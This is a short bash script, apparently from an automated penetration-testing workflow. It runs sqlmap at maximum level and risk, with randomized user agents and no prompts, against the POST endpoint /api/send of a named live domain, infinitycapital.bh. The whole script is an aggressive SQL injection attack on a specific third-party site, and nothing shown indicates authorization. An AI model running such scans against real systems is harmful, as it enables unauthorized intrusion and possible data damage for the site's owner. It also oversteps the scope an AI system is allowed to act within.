#!/bin/bash
cd "$WORK_PATH" || exit 1
mkdir -p tool_outputs/sqlmap
DATA=$(cat tool_outputs/send_data.txt)
echo "===== SQLMAP /api/send all params ====="
timeout 900 sqlmap -u "https://www.infinitycapital.bh/api/send" --data "$DATA" --method POST \
  --batch --level=5 --risk=3 --threads=4 --random-agent --timeout=15 --retries=1 \
  --output-dir=tool_outputs/sqlmap 2>&1 | tail -60
